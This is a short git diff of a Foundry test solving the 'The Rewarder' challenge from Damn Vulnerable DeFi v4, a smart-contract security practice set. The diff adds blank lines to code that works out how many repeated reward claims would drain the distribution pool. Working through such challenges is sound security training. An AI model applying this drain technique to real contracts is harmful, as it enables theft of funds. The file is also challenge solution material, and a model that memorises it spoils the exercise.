@@ -151,9 +151,11 @@ contract TheRewarderChallenge is Test {
     // references: https://medium.com/@opensiddhu993/challenge-5-the-rewarder-damn-vulnerable-defi-v4-lazy-solutions-series-a08e32b84df9
         uint ATTACKER_DVT_CLAIM_AMOUNT = 11524763827831882;
         uint ATTACKER_WETH_CLAIM_AMOUNT = 1171088749244340;
+        
         // Finding the attackers' address
         console.log('address(player)');
         console.log(address(player));
+
         // Calculate how many transactions are needed to drain the pool
         uint256 dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / ATTACKER_DVT_CLAIM_AMOUNT;
         uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / ATTACKER_WETH_CLAIM_AMOUNT;
